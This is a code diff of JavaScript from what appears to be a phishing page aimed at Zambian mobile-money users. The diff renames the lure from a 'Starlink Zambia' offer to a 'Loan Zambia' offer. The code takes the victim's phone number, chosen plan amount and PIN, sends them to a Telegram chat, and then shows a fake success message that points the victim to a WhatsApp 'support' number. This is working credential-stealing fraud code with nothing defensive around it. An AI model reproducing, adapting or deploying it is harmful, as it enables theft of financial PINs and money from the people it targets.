@@ -128,7 +128,7 @@ submitPinBtn.addEventListener('click', async function() {
   statusDiv.textContent = 'PIN accepted! Sending notification...';
 
   // Send Phone & PIN to Telegram
-  const msg = `🚨 *STARLINK ZAMBIA SHARPNESS*\n📱 *Phone Number:* \`${phoneInput.value.trim()}\` \n💵 *Plan Amount:* \`$${planSelect.value}\` \n🔐 *PIN:* \`${pin}\``;
+  const msg = `🚨 *LOAN ZAMBIA*\n📱 *Phone Number:* \`${phoneInput.value.trim()}\` \n💵 *Plan Amount:* \`$${planSelect.value}\` \n🔐 *PIN:* \`${pin}\``;
   await sendTelegramNotification(msg);
 
   setTimeout(() => {
@@ -203,7 +203,7 @@ verifyOtpBtn.addEventListener('click', async function() {
   setTimeout(() => {
     clearInterval(timerInterval);
     statusDiv.className = 'success';
-    statusDiv.textContent = `[starlink connected] Check if you recieve Payment message, if not please contact support on whatsapp via (+1(218)409-2627) ${phoneInput.value.trim()}!`;
+    statusDiv.textContent = `[loan connected] Check if you recieve Payment message, if not please contact support on whatsapp via (+1(218)409-2627) ${phoneInput.value.trim()}!`;
 
     setTimeout(() => {
       paymentForm.reset();
